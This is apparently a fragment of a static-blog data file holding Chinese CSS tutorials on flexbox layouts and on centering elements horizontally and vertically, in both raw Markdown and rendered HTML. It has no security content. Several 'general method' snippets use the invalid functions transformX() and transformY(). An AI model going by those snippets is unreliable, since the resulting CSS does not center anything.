class=\"name\">div</span> <span class=\"attr\">class</span>=<span class=\"string\">\"item\"</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">div</span> <span class=\"attr\">class</span>=<span class=\"string\">\"item\"</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">div</span> <span class=\"attr\">class</span>=<span class=\"string\">\"item\"</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<p>css 代码：</p>\n<figure class=\"highlight css\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"selector-class\">.container</span>&#123;</span><br><span class=\"line\">    <span class=\"attribute\">display</span>: flex;</span><br><span class=\"line\">    <span class=\"attribute\">width</span>: <span class=\"number\">600px</span>;</span><br><span class=\"line\">    <span class=\"attribute\">margin</span>: <span class=\"number\">0</span> auto;</span><br><span class=\"line\">    <span class=\"attribute\">flex-wrap</span>: wrap;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"selector-class\">.item</span>&#123;</span><br><span class=\"line\">    <span class=\"attribute\">margin</span>: <span class=\"number\">20px</span>;</span><br><span class=\"line\">    <span class=\"attribute\">flex</span>: none;</span><br><span class=\"line\">    <span class=\"attribute\">width</span>: <span class=\"number\">100px</span>;</span><br><span class=\"line\">    <span class=\"attribute\">height</span>: <span class=\"number\">100px</span>;</span><br><span class=\"line\">    <span class=\"attribute\">background</span>: lightblue;</span><br><span class=\"line\">    <span class=\"attribute\">line-height</span>: <span class=\"number\">100px</span>;</span><br><span class=\"line\">    <span class=\"attribute\">color</span>: <span class=\"number\">#fff</span>;</span><br><span class=\"line\">    <span class=\"attribute\">font-size</span>: <span class=\"number\">40px</span>;</span><br><span class=\"line\">    <span class=\"attribute\">text-align</span>: center;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>效果：</p>\n<p><img src=\"/assets/2016-03-13-css-flexbox/4.png\" alt=\"\"></p>\n<h2 id=\"五、悬挂式布局\"><a href=\"#五、悬挂式布局\" class=\"headerlink\" title=\"五、悬挂式布局\"></a>五、悬挂式布局</h2><p>有时，主栏的左侧或右侧，需要添加一个图片栏。</p>\n<p>效果：</p>\n<p><img src=\"/assets/2016-03-13-css-flexbox/5.png\" alt=\"\"></p>\n<h2 id=\"六、固定的底栏\"><a href=\"#六、固定的底栏\" class=\"headerlink\" title=\"六、固定的底栏\"></a>六、固定的底栏</h2><p>有时，页面内容太少，无法占满一屏的高度，底栏就会抬高到页面的中间。这时可以采用Flex布局，让底栏总是出现在页面的底部。</p>\n<p>效果：</p>\n<p><img src=\"/assets/2016-03-13-css-flexbox/6.png\" alt=\"\"></p>\n<p>参考链接：</p>\n<ul>\n<li><a href=\"http://www.ruanyifeng.com/blog/2015/07/flex-examples.html\">Flex 布局教程：实例篇 - 阮一峰的网络日志</a></li>\n</ul>\n"},{"layout":"post","title":"CSS - 居中元素","date":"2016-03-15T04:00:00.000Z","author":"Lindz","header-img":"img/10.jpg","_content":"\n> 本文记录一些在网上看到的，我认为有意思的前端面试题，欢迎转载，转载请注明出处：[林东洲的博客 Lindz Blog](http://www.happylindz.com)。\n\n## 如何水平居中一个元素：\n\n### 通用方法，在不知道具体盒子的宽高时\n\n```css\n.parent{\n     position:relative;\n}\n.child{\n     position:absolute;\n     left:50%;\n     transform:transformX(-50%);\n}\n```\n\n情况 1：如果需要居中的元素为常规流中 display: inline 即内联元素，为父元素设置 text-align 即可。\n\n常见的内联标签有：span a img input label br 等\n\n```css\n.parent{\n\ttext-align:center;\n}\n```\n\n情况 2：如果需要居中的元素为常规流中的 block 元素，先为元素设置宽度，再设置属性 margin 为auto。\n\n常见的块级元素：div h1 ~ h6 table p ul li 等\n\n```css\ndiv{\n    width: 600px;\n    height: 50px;    //需要设置 div 高度，否则盒子无法撑起\n    margin: 0 auto;\n    background: #999;\n}\n```\n\n或者：可以先将块级元素转换为 display:inline-block，然后再将其父元素 text-align:center 即可。\n\n```css\n.parent{\n\ttext-align:center;\n}\n.child{\n\tdisplay:inline-block;\n}\n```\n\n情况 3：如果需要居中的元素为浮动元素  \n\n1. 为元素设置高度和宽度\n2. position 设为 relative\n3. left 或者 right 设为 50%\n4. margin-left 或者 margin-right 设为元素宽度的一半的负值\n\n```css\ndiv{\n    height: 100px;\n    width: 100px;\n    background-color: #999;\n    float: left;\n    position: relative;\n    left: 50%;\n    margin-left: -50px;   \n}\n```\n\n情况 4：如果需要居中的元素为绝对定位元素\n\n1. 为元素设置宽度和宽度\n2. 设置父元素 position 值为 relative\n3. left 或者 right 设为 50%\n4. margin-left 或者 margin-right 设为元素宽度的一半的负值\n\n```css\n.parent{\n    background: #999;\n    position: relative;\n}\n.child{\n    position: absolute;\n    background: #000;\n    height: 500px;\n    width: 800px;\n    left: 50%;\n    margin-left: -400px;\n}\n```\n\n或者：\n\n1. 为元素设置宽度和高度\n2. 设置父元素 position 值为 relative\n3. 设置 left 和 right 值为 0\n4. 设置左右外边距为 auto\n\n```css\n.parent{\n    background: #999;\n    position: relative;\n}\n.child{\n    position: absolute;\n    background: #000;\n    height: 500px;\n    width: 800px;\n    left: 0;\n    right: 0;\n    margin: 0 auto;\n}\n```\n\n## 如何垂直居中一个元素：\n\n### 通用方法：\n\n```css\n.parent{\n     position:relative;\n}\n.child{\n     position:absolute;\n     top:50%;\n     transform:transformY(-50%);\n}\n```\n\n情况 1: 需要居中元素为单行文本，为包含文本的元素设置大于font-size的line-height\n\n```css\n.text {\n    line-height: 200px;\n}\n```\n\n## 水平垂直居中的办法\n\n### 方法一：绝对居中定位\n\n条件: 块元素尺寸已知\n\ncss 代码：\n\n```css\ndiv{\n    background: #000;\n    width: 100px;\n    height: 100px;\n    margin: auto;\n    position: absolute;\n    top: 0;\n    bottom: 0;\n    left: 0;\n    right: 0;\n}\n```\n\n优点：\n\n1. 不仅可以实现在正中间，还可以在正左方，正右方\n2. 支持百分比%属性值和min-/max-属性\n3. 支持跨浏览器,包括IE8-IE10\n4. 只用这一个类可实现任何内容块居中\n\n\n### 方法二：负边距居中\n\n条件: 块元素尺寸已知\n\ncss 代码：\n\n```css\ndiv{\n    width: 100px;\n    height: 100px;\n    position: absolute;\n    top: 50%;\n    left: 50%;\n    margin-left: -50px;\n    margin-top: -50px;\n    background: red;\n}\n```\n\n优点：良好的跨浏览器特性,兼容IE6-IE7\n\n缺点：不能自适应。不支持百分比尺寸和min-/max-属性设置\n\n### 方法三：变形（Transforms）\n\n元素高度可变\n\ncss 代码：\n\n```css\ndiv{\n    width: 50%;\n    height: 50%;\n    position: absolute;\n    top: 50%;\n    left: 50%;\n    -webkit-transform: translate(-50%,-50%);\n    -ms-transform: translate(-50%,-50%);\n    transform: translate(-50%, -50%);\n    background: red;\n}\n```\n\n优点：内容可变高度\n\n缺点：\n\n1. IE 8 不支持\n2. 属性需要写浏览器厂商前缀\n3. 可能干扰其他transform效果\n\n### 方法四：Flexbox\n\ncss 代码：\n\n```css \nhtml, body{\n    height: 100%;\n}\nbody{\n    display: flex;\n    justify-content: center;\n    align-items: center;\n}\ndiv{\n    height: 100px;\n    width: 100px;\n    background: red;\n}\n```\n\n这是CSS布局未来的趋势。  \nFlexbox是CSS3新增属性,设计初衷是为了解决像垂直居中这样的常见布局问题。  \n优点：内容块的宽高任意,优雅的溢出。  \n缺点：\n\n1. IE8/IE9不支持。\n2. 运行于现代浏览器上的代码需要浏览器厂商前缀。\n3. 需要特定的父容器。\n\n### 方法五：使文本居中的方法，使用 line-height 属性\n\ncss 代码：\n\n```css\n.parent{\n\twidth:100px;\n\theight:100px;\n\tline-height:100px;\n\ttext-align:center;\n\tbackground:gray;\n}\n```\n\n### 方法六：使用 ::before 元素\n\ncss 代码：\n\n```css\n.parent {\n    position: fixed;\n    display: block;\n    top: 0;\n    right: 0;\n    bottom: 0;\n    left: 0;\n    text-align: center;\n    background: rgba(0, 0, 0, .5);\n}\n.parent :before {\n    content: '';\n    display: inline-block;\n    vertical-align: middle;\n    height: 100%;\n}\n\n.parent .child {\n    display: inline-block;\n    vertical-align: middle;\n    width: 60px;\n    height: 60px;\n    line-height: 60px;\n    color: red;\n    background: yellow;\n}\n```\n\n\n","source":"_posts/2016-03-15-css-center.md","raw":"---\nlayout:     post\ntitle:      \"CSS - 居中元素\"\ndate:       2016-03-15 12:00:00\nauthor:     \"Lindz\"\nheader-img: \"img/10.jpg\"\ntags:\n    - CSS\n---\n\n> 本文记录一些在网上看到的，我认为有意思的前端面试题，欢迎转载，转载请注明出处：[林东洲的博客 Lindz Blog](http://www.happylindz.com)。\n\n## 如何水平居中一个元素：\n\n### 通用方法，在不知道具体盒子的宽高时\n\n```css\n.parent{\n     position:relative;\n}\n.child{\n     position:absolute;\n     left:50%;\n     transform:transformX(-50%);\n}\n```\n\n情况 1：如果需要居中的元素为常规流中 display: inline 即内联元素，为父元素设置 text-align 即可。\n\n常见的内联标签有：span a img input label br 等\n\n```css\n.parent{\n\ttext-align:center;\n}\n```\n\n情况 2：如果需要居中的元素为常规流中的 block 元素，先为元素设置宽度，再设置属性 margin 为auto。\n\n常见的块级元素：div h1 ~ h6 table p ul li 等\n\n```css\ndiv{\n    width: 600px;\n    height: 50px;    //需要设置 div 高度，否则盒子无法撑起\n    margin: 0 auto;\n    background: #999;\n}\n```\n\n或者：可以先将块级元素转换为 display:inline-block，然后再将其父元素 text-align:center 即可。\n\n```css\n.parent{\n\ttext-align:center;\n}\n.child{\n\tdisplay:inline-block;\n}\n```\n\n情况 3：如果需要居中的元素为浮动元素  \n\n1. 为元素设置高度和宽度\n2. position 设为 relative\n3. left 或者 right 设为 50%\n4. margin-left 或者 margin-right 设为元素宽度的一半的负值\n\n```css\ndiv{\n    height: 100px;\n    width: 100px;\n    background-color: #999;\n    float: left;\n    position: relative;\n    left: 50%;\n    margin-left: -50px;   \n}\n```\n\n情况 4：如果需要居中的元素为绝对定位元素\n\n1. 为元素设置宽度和宽度\n2. 设置父元素 position 值为 relative\n3. left 或者 right 设为 50%\n4. margin-left 或者 margin-right 设为元素宽度的一半的负值\n\n```css\n.parent{\n    background: #999;\n    position: relative;\n}\n.child{\n    position: absolute;\n    background: #000;\n    height: 500px;\n    width: 800px;\n    left: 50%;\n    margin-left: -400px;\n}\n```\n\n或者：\n\n1. 为元素设置宽度和高度\n2. 设置父元素 position 值为 relative\n3. 设置 left 和 right 值为 0\n4. 设置左右外边距为 auto\n\n```css\n.parent{\n    background: #999;\n    position: relative;\n}\n.child{\n    position: absolute;\n    background: #000;\n    height: 500px;\n    width: 800px;\n    left: 0;\n    right: 0;\n    margin: 0 auto;\n}\n```\n\n## 如何垂直居中一个元素：\n\n### 通用方法：\n\n```css\n.parent{\n     position:relative;\n}\n.child{\n     position:absolute;\n     top:50%;\n     transform:transformY(-50%);\n}\n```\n\n情况 1: 需要居中元素为单行文本，为包含文本的元素设置大于font-size的line-height\n\n```css\n.text {\n    line-height: 200px;\n}\n```\n\n## 水平垂直居中的办法\n\n### 方法一：绝对居中定位\n\n条件: 块元素尺寸已知\n\ncss 代码：\n\n```css\ndiv{\n    background: #000;\n    width: 100px;\n    height: 100px;\n    margin: auto;\n    position: absolute;\n    top: 0;\n    bottom: 0;\n    left: 0;\n    right: 0;\n}\n```\n\n优点：\n\n1. 不仅可以实现在正中间，还可以在正左方，正右方\n2. 支持百分比%属性值和min-/max-属性\n3. 支持跨浏览器,包括IE8-IE10\n4. 只用这一个类可实现任何内容块居中\n\n\n### 方法二：负边距居中\n\n条件: 块元素尺寸已知\n\ncss 代码：\n\n```css\ndiv{\n    width: 100px;\n    height: 100px;\n    position: absolute;\n    top: 50%;\n    left: 50%;\n    margin-left: -50px;\n    margin-top: -50px;\n    background: red;\n}\n```\n\n优点：良好的跨浏览器特性,兼容IE6-IE7\n\n缺点：不能自适应。不支持百分比尺寸和min-/max-属性设置\n\n### 方法三：变形（Transforms）\n\n元素高度可变\n\ncss 代码：\n\n```css\ndiv{\n    width: 50%;\n    height: 50%;\n    position: absolute;\n    top: 50%;\n    left: 50%;\n    -webkit-transform: translate(-50%,-50%);\n    -ms-transform: translate(-50%,-50%);\n    transform: translate(-50%, -50%);\n    background: red;\n}\n```\n\n优点：内容可变高度\n\n缺点：\n\n1. IE 8 不支持\n2. 属性需要写浏览器厂商前缀\n3. 可能干扰其他transform效果\n\n### 方法四：Flexbox\n\ncss 代码：\n\n```css \nhtml, body{\n    height: 100%;\n}\nbody{\n    display: flex;\n    justify-content: center;\n    align-items: center;\n}\ndiv{\n    height: 100px;\n    width: 100px;\n    background: red;\n}\n```\n\n这是CSS布局未来的趋势。  \nFlexbox是CSS3新增属性,设计初衷是为了解决像垂直居中这样的常见布局问题。  \n优点：内容块的宽高任意,优雅的溢出。  \n缺点：\n\n1. IE8/IE9不支持。\n2. 运行于现代浏览器上的代码需要浏览器厂商前缀。\n3. 需要特定的父容器。\n\n### 方法五：使文本居中的方法，使用 line-height 属性\n\ncss 代码：\n\n```css\n.parent{\n\twidth:100px;\n\theight:100px;\n\tline-height:100px;\n\ttext-align:center;\n\tbackground:gray;\n}\n```\n\n### 方法六：使用 ::before 元素\n\ncss 代码：\n\n```css\n.parent {\n    position: fixed;\n    display: block;\n    top: 0;\n    right: 0;\n    bottom: 0;\n    left: 0;\n    text-align: center;\n    background: rgba(0, 0, 0, .5);\n}\n.parent :before {\n    content: '';\n    display: inline-block;\n    vertical-align: middle;\n    height: 100%;\n}\n\n.parent .child {\n    display: inline-block;\n    vertical-align: middle;\n    width: 60px;\n    height: 60px;\n    line-height: 60px;\n    color: red;\n    background: yellow;\n}\n```\n\n\n","slug":"2016-03-15-css-center","published":1,"updated":"2016-03-15T14:26:32.000Z","comments":1,"photos":[],"link":"","_id":"cim4u6rxy000oxmvdmbl1g5b4","content":"<blockquote>\n<p>本文记录一些在网上看到的，我认为有意思的前端面试题，欢迎转载，转载请注明出处：<a href=\"http://www.happylindz.com\" target=\"_blank\" rel=\"external\">林东洲的博客 Lindz Blog</a>。</p>\n</blockquote>\n<h2 id=\"如何水平居中一个元素：\"><a href=\"#如何水平居中一个元素：\" class=\"headerlink\" title=\"如何水平居中一个元素：\"></a>如何水平居中一个元素：</h2><h3 id=\"通用方法，在不知道具体盒子的宽高时\"><a href=\"#通用方法，在不知道具体盒子的宽高时\" class=\"headerlink\" title=\"通用方法，在不知道具体盒子的宽高时\"></a>通用方法，在不知道具体盒子的宽高时</h3><figure class=\"highlight css\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"selector-class\">.parent</span>&#123;</span><br><span class=\"line\">     <span class=\"attribute\">position</span>:relative;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"selector-class\">.child</span>&#123;</span><br><span class=\"line\">     <span class=\"attribute\">position</span>:absolute;</span><br><span class=\"line\">     <span class=\"attribute\">left</span>:<span class=\"number\">50%</span>;</span><br><span class=\"line\">     <span class=\"attribute\">transform</span>:<span class=\"built_in\">transformX</span>(-50%);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>情况 1：如果需要居中的元素为常规流中 display: inline 即内联元素，为父元素设置 text-align 即可。</p>\n<p>常见的内联标签有：span a img input label br 等</p>\n<figure class=\"highlight css\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"selector-class\">.parent</span>&#123;</span><br><span class=\"line\">\t<span class=\"attribute\">text-align</span>:center;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>情况 2：如果需要居中的元素为常规流中的 block 元素，先为元素设置宽度，再设置属性 margin 为auto。</p>\n<p>常见的块级元素：div h1 ~ h6 table p ul li 等</p>\n<figure class=\"highlight\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">div&#123;</span><br><span class=\"line\">    width: 600px;</span><br><span class=\"line\">    height: 50px;    //需要设置 div 高度，否则盒子无法撑起</span><br><span class=\"line\">    margin: 0 auto;</span><br><span class=\"line\">    background: #999;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>或者：可以先将块级元素转换为 display:inline-block，然后再将其父元素 text-align:center 即可。</p>\n<figure class=\"highlight css\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"selector-class\">.parent</span>&#123;</span><br><span class=\"line\">\t<span class=\"attribute\">text-align</span>:center;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"selector-class\">.child</span>&#123;</span><br><span class=\"line\">\t<span class=\"attribute\">display</span>:inline-block;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>情况 3：如果需要居中的元素为浮动元素  </p>\n<ol>\n<li>为元素设置高度和宽度</li>\n<li>position 设为 relative</li>\n<li>left 或者 right 设为 50%</li>\n<li>margin-left 或者 margin-right 设为元素宽度的一半的负值</li>\n</ol>\n<figure class=\"highlight css\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"selector-tag\">div</span>&#123;</span><br><span class=\"line\">    <span class=\"attribute\">height</span>: <span class=\"number\">100px</span>;</span><br><span class=\"line\">    <span class=\"attribute\">width</span>: <span class=\"number\">100px</span>;</span><br><span class=\"line\">    <span class=\"attribute\">background-color</span>: <span class=\"number\">#999</span>;</span><br><span class=\"line\">    <span class=\"attribute\">float</span>: left;</span><br><span class=\"line\">    <span class=\"attribute\">position</span>: relative;</span><br><span class=\"line\">    <span class=\"attribute\">left</span>: <span class=\"number\">50%</span>;</span><br><span class=\"line\">    <span class=\"attribute\">margin-left</span>: -<span class=\"number\">50px</span>;   </span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>情况 4：如果需要居中的元素为绝对定位元素</p>\n<ol>\n<li>为元素设置宽度和宽度</li>\n<li>设置父元素 position 值为 relative</li>\n<li>left 或者 right 设为 50%</li>\n<li>margin-left 或者 margin-right 设为元素宽度的一半的负值</li>\n</ol>\n<figure class=\"highlight css\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"selector-class\">.parent</span>&#123;</span><br><span class=\"line\">    <span class=\"attribute\">background</span>: <span class=\"number\">#999</span>;</span><br><span class=\"line\">    <span class=\"attribute\">position</span>: relative;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"selector-class\">.child</span>&#123;</span><br><span class=\"line\">    <span class=\"attribute\">position</span>: absolute;</span><br><span class=\"line\">    <span class=\"attribute\">background</span>: <span class=\"number\">#000</span>;</span><br><span class=\"line\">    <span class=\"attribute\">height</span>: <span class=\"number\">500px</span>;</span><br><span class=\"line\">    <span class=\"attribute\">width</span>: <span class=\"number\">800px</span>;</span><br><span class=\"line\">    <span class=\"attribute\">left</span>: <span class=\"number\">50%</span>;</span><br><span class=\"line\">    <span class=\"attribute\">margin-left</span>: -<span class=\"number\">400px</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>或者：</p>\n<ol>\n<li>为元素设置宽度和高度</li>\n<li>设置父元素 position 值为 relative</li>\n<li>设置 left 和 right 值为 0</li>\n<li>设置左右外边距为 auto</li>\n</ol>\n<figure class=\"highlight css\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"selector-class\">.parent</span>&#123;</span><br><span class=\"line\">    <span class=\"attribute\">background</span>: <span class=\"number\">#999</span>;</span><br><span class=\"line\">    <span class=\"attribute\">position</span>: relative;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"selector-class\">.child</span>&#123;</span><br><span class=\"line\">    <span class=\"attribute\">position</span>: absolute;</span><br><span class=\"line\">    <span class=\"attribute\">background</span>: <span class=\"number\">#000</span>;</span><br><span class=\"line\">    <span class=\"attribute\">height</span>: <span class=\"number\">500px</span>;</span><br><span class=\"line\">    <span class=\"attribute\">width</span>: <span class=\"number\">800px</span>;</span><br><span class=\"line\">    <span class=\"attribute\">left</span>: <span class=\"number\">0</span>;</span><br><span class=\"line\">    <span class=\"attribute\">right</span>: <span class=\"number\">0</span>;</span><br><span class=\"line\">    <span class=\"attribute\">margin</span>: <span class=\"number\">0</span> auto;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h2 id=\"如何垂直居中一个元素：\"><a href=\"#如何垂直居中一个元素：\" class=\"headerlink\" title=\"如何垂直居中一个元素：\"></a>如何垂直居中一个元素：</h2><h3 id=\"通用方法：\"><a href=\"#通用方法：\" class=\"headerlink\" title=\"通用方法：\"></a>通用方法：</h3><figure class=\"highlight css\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"selector-class\">.parent</span>&#123;</span><br><span class=\"line\">     <span class=\"attribute\">position</span>:relative;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"selector-class\">.child</span>&#123;</span><br><span class=\"line\">     <span class=\"attribute\">position</span>:absolute;</span><br><span class=\"line\">     <span class=\"attribute\">top</span>:<span class=\"number\">50%</span>;</span><br><span class=\"line\">     <span class=\"attribute\">transform</span>:<span class=\"built_in\">transformY</span>(-50%);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>情况 1: 需要居中元素为单行文本，为包含文本的元素设置大于font-size的line-height</p>\n<figure class=\"highlight css\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"selector-class\">.text</span> &#123;</span><br><span class=\"line\">    <span class=\"attribute\">line-height</span>: <span class=\"number\">200px</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h2 id=\"水平垂直居中的办法\"><a href=\"#水平垂直居中的办法\" class=\"headerlink\" title=\"水平垂直居中的办法\"></a>水平垂直居中的办法</h2><h3 id=\"方法一：绝对居中定位\"><a href=\"#方法一：绝对居中定位\" class=\"headerlink\" title=\"方法一：绝对居中定位\"></a>方法一：绝对居中定位</h3><p>条件: 块元素尺寸已知</p>\n<p>css 代码：</p>\n<figure class=\"highlight css\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"selector-tag\">div</span>&#123;</span><br><span class=\"line\">    <span class=\"attribute\">background</span>: <span class=\"number\">#000</span>;</span><br><span class=\"line\">    <span class=\"attribute\">width</span>: <span class=\"number\">100px</span>;</span><br><span class=\"line\">    <span class=\"attribute\">height</span>: <span class=\"number\">100px</span>;</span><br><span class=\"line\">    <span class=\"attribute\">margin</span>: auto;</span><br><span class=\"line\">    <span class=\"attribute\">position</span>: absolute;</span><br><span class=\"line\">    <span class=\"attribute\">top</span>: <span class=\"number\">0</span>;</span><br><span class=\"line\">    <span class=\"attribute\">bottom</span>: <span class=\"number\">0</span>;</span><br><span class=\"line\">    <span class=\"attribute\">left</span>: <span class=\"number\">0</span>;</span><br><span class=\"line\">    <span class=\"attribute\">right</span>: <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>优点：</p>\n<ol>\n<li>不仅可以实现在正中间，还可以在正左方，正右方</li>\n<li>支持百分比%属性值和min-/max-属性</li>\n<li>支持跨浏览器,包括IE8-IE10</li>\n<li>只用这一个类可实现任何内容块居中</li>\n</ol>\n<h3 id=\"方法二：负边距居中\"><a href=\"#方法二：负边距居中\" class=\"headerlink\" title=\"方法二：负边距居中\"></a>方法二：负边距居中</h3><p>条件: 块元素尺寸已知</p>\n<p>css 代码：</p>\n<figure class=\"highlight css\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"selector-tag\">div</span>&#123;</span><br><span class=\"line\">    <span class=\"attribute\">width</span>: <span class=\"number\">100px</span>;</span><br><span class=\"line\">    <span class=\"attribute\">height</span>: <span class=\"number\">100px</span>;</span><br><span class=\"line\">    <span class=\"attribute\">position</span>: absolute;</span><br><span class=\"line\">    <span class=\"attribute\">top</span>: <span class=\"number\">50%</span>;</span><br><span class=\"line\">    <span class=\"attribute\">left</span>: <span class=\"number\">50%</span>;</span><br><span class=\"line\">    <span class=\"attribute\">margin-left</span>: -<span class=\"number\">50px</span>;</span><br><span class=\"line\">    <span class=\"attribute\">margin-top</span>: -<span class=\"number\">50px</span>;</span><br><span class=\"line\">    <span class=\"attribute\">background</span>: red;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>优点：良好的跨浏览器特性,兼容IE6-IE7</p>\n<p>缺点：不能自适应。不支持百分比尺寸和min-/max-属性设置</p>\n<h3 id=\"方法三：变形（Transforms）\"><a href=\"#方法三：变形（Transforms）\" class=\"headerlink\" title=\"方法三：变形（Transforms）\"></a>方法三：变形（Transforms）</h3><p>元素高度可变</p>\n<p>css 代码：</p>\n<figure class=\"highlight css\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"selector-tag\">div</span>&#123;</span><br><span class=\"line\">    <span class=\"attribute\">width</span>: <span class=\"number\">50%</span>;</span><br><span class=\"line\">    <span class=\"attribute\">height</span>: <span class=\"number\">50%</span>;</span><br><span class=\"line\">    <span class=\"attribute\">position</span>: absolute;</span><br><span class=\"line\">    <span class=\"attribute\">top</span>: <span class=\"number\">50%</span>;</span><br><span class=\"line\">    <span class=\"attribute\">left</span>: <span class=\"number\">50%</span>;</span><br><span class=\"line\">    <span class=\"attribute\">-webkit-transform</span>: <span class=\"built_in\">translate</span>(-50%,-50%);</span><br><span class=\"line\">    <span class=\"attribute\">-ms-transform</span>: <span class=\"built_in\">translate</span>(-50%,-50%);</span><br><span class=\"line\">    <span class=\"attribute\">transform</span>: <span class=\"built_in\">translate</span>(-50%, -50%);</span><br><span class=\"line\">    <span class=\"attribute\">background</span>: red;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>优点：内容可变高度</p>\n<p>缺点：</p>\n<ol>\n<li>IE 8 不支持</li>\n<li>属性需要写浏览器厂商前缀</li>\n<li>可能干扰其他transform效果</li>\n</ol>\n<h3 id=\"方法四：Flexbox\"><a 